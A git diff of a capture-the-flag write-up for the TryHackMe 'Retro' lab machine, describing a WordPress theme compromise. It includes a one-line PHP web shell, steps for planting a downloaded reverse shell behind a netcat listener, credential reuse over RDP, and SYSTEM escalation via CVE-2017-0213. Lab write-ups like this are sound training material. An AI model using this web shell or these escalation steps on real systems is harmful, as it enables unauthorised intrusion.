@@ -1,5 +1,10 @@
 # Retro Writeup
 
+They say there are two paths when completing this room. The first path goes as follows:
+* Initial Access
+* CVE-2019-1388 for SYSTEM
+IF the last step doesn't work for you as it didn't for me you may follow a different path for gaining SYSTEM level access.
+
 https://tryhackme.com/room/retro
 
 ## Task 1 Pwn
@@ -91,22 +96,28 @@ connect to [10.6.14.57] from (UNKNOWN) [10.10.204.15] 49891
 operable program or batch file.
 ```
 
+
+
+
 So I swap this shell out with this simple php web shell to see if we can even get RCE. `<?php system($_GET["cmd"]);?>`
 Then I navigate back to the location of the archive.php and pass in a parameter for 'cmd'.
 ![alt text](https://github.com/nickswink/Retro-WriteUp/blob/main/webshell.PNG?raw=true)
 
-Great! Now that I know we have RCE I can try a full reverse shell. I got mine from [here](https://github.com/Dhayalanb/windows-php-reverse-shell). I just had to change the ip and port. Then make the tmpdir = "C:\\inetpub\\wwwroot\\retro\\wp-content\\themes\\90s-retro". 
-* Copy and paste it into archive.php
+Great! Now that I know we have RCE and I can try a full reverse shell. I got mine from [here](https://github.com/Dhayalanb/windows-php-reverse-shell). I just had to change the ip and port. Then make the tmpdir = "C:\\inetpub\\wwwroot\\retro\\wp-content\\themes\\90s-retro". 
+* Copy and paste the shell into archive.php
 * Scroll down and click 'Upload File'
 * Then set up a netcat listener in a terminal
 * Navigate to archive.php in the browser just like before.
 
 ![alt text](https://github.com/nickswink/Retro-WriteUp/blob/main/reverseshell.PNG?raw=true)
 
-After this I remembered that RDP was enabled and just for the hell of it I tried the same credentials from earlier. SURPRISE they work for RDP. This is better than our shell because we have a real account instead of a service account. We can find user.txt at C:\Users\Wade\Desktop\user.txt
+After this I remembered that RDP was enabled and just for the hell of it I tried the same credentials from earlier. SURPRISE they work for RDP. This is better than our reverse shell because we have a real account instead of a service account. We can find user.txt at C:\Users\Wade\Desktop\user.txt
+
+THIS WOULD BE THE POINT IN WHICH YOU SHOULD EXPLORE WHAT THE USER WAS TRYING TO FIX WHICH WAS CVE-2019-1388. IF IT DOES NOT WORK FOR YOU DUE TO A POP UP THEN CONTINUE ON.
+![alt text](https://github.com/nickswink/Retro-WriteUp/blob/main/popup.PNG?raw=true)
 
 
-After enumerating with windows-exploit-suggester.py I tried a few different CVEs for priviledge escalation but no success. The exploit I had success with was [CVE-2017-0213](https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213). The CVE is extremely simple to use. You just get the exe file onto the victim  and run it. It will then open up a shell running as SYSTEM.
+After enumerating with windows-exploit-suggester.py I tried a few different CVEs for priviledge escalation but no success. The exploit I finally had success with was [CVE-2017-0213](https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213). The CVE is extremely simple to use. You just get the exe file onto the victim  and run it. It will then open up a shell running as SYSTEM.
 
 ![alt text](https://github.com/nickswink/Retro-WriteUp/blob/main/root.PNG?raw=true)
 
